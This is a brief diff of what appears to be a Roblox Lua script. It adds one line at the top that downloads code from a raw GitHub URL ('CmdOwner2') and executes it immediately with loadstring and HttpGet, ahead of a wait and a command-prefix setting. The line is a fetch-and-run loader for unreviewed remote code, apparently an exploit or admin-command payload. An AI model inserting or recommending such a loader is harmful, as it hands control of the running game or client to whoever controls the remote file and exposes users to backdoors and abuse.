@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vinciuszk70/vinciuszk70/main/CmdOwner2", true))()
 wait(5)
 Prefix = "-"
 
